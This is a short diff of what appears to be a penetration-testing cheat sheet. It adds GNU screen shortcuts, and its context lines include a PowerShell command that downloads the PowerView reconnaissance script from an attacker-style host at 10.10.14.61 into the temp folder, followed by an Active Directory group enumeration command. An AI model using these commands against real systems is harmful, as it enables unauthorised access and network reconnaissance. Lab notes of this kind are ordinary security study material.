@@ -6,6 +6,15 @@
 Invoke-WebRequest -Uri "http://10.10.14.61:8000/PowerView.ps1" -OutFile "$env:temp\PowerView.ps1"
 ```
 
+SCREEN TTY
+```
+ctrl+a d     detach
+screen -ls
+screen -r WEB   resume
+screen -R WEB 	create
+ctrl+a escape   scrollmode - hit escape again to escape
+```
+
 List all AD-Groups
 ```
 Get-ADGroup -filter *
